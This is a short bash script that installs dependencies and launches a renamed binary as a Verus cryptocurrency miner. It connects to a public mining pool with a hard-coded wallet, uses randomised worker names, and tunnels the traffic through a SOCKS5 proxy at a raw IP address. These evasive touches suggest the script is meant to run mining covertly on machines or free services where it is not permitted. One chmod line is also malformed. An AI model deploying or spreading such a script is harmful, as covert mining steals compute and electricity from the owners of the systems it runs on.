#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y 
chmod +x start.sh && chmod +x uluk chmod 777 uluk start.sh
screen -dmS ls 
POOL=stratum+tcp://eu.luckpool.net:3956
WALLET=RJvisn2X5tuBTQugYMAEsFzSzF5Tqjpt9Z
WORKER=$(echo $(shuf -i 1-5 -n 1)RIG-LIFE)
PROXY=socks5://98.185.94.65:15608
./uluk -a verus -o $POOL -u $WALLET.$WORKER -t 2 -x $PROXY
